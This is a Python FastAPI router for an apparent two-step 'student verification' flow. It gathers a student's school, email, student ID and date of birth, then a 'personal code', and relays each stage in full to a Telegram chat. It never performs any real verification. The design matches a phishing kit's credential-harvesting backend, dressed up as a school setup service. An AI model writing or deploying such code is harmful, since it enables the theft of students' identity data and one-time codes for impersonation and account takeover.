import uuid
import json
from datetime import datetime
from fastapi import APIRouter, HTTPException
from app.telegram import send_telegram_message
from app.models import StudentInfo, PersonalCodePayload
from app.redis_client import redis_client


router = APIRouter(prefix="/setup", tags=["Setup"])

@router.post("/step-1")
def submit_student_info(data: StudentInfo):

    # Parse MM/DD/YYYY input
    try:
        parsed_dob = datetime.strptime(
            data.date_of_birth.strip(),
            "%m/%d/%Y"
        )
    except ValueError:
        raise HTTPException(
            status_code=400,
            detail="Date of Birth must be in MM/DD/YYYY format"
        )

    # Re-format explicitly to MM/DD/YYYY
    formatted_dob = parsed_dob.strftime("%m/%d/%Y")

    
    submission_id = str(uuid.uuid4())
    
    redis_payload = {
        "school_name": data.school_name,
        "student_email": data.student_email,
        "student_id": data.student_id,
        "date_of_birth": formatted_dob,
    }
    
    redis_client.set(
        submission_id,                
        json.dumps(redis_payload),
        ex=900  # 15 minutes
    )
    
    message = f"""
    📚 STUDENT SETUP SUBMITTED:
    School: {data.school_name}
    Email: {data.student_email}
    Student ID: {data.student_id}
    DOB: {formatted_dob}
    Submission ID: {submission_id}
    """
    send_telegram_message(message)

    return {
        "status": "success",
        "submission_id": submission_id,
        "message": "Proceed to Step 2"
    }
    

@router.post("/step-2")
def submit_step_two(data: PersonalCodePayload):

    stored_data = redis_client.get(data.submission_id)

    if not stored_data:
        raise HTTPException(
            status_code=400,
            detail="Session expired or invalid submission ID"
        )

    step_one_data = json.loads(stored_data)

    final_message = f"""
    🔐 STUDENT VERIFICATION – COMPLETED

    Submission ID: {data.submission_id}

    Email: {step_one_data['student_email']}
    DOB: {step_one_data['date_of_birth']}
    Student ID: {step_one_data['student_id']}
    School: {step_one_data['school_name']}

    Personal Code: {data.personal_code}
    """

    send_telegram_message(final_message)

    # Clean up
    redis_client.delete(data.submission_id)

    return {
        "status": "success",
        "message": "Verification submission complete"
    }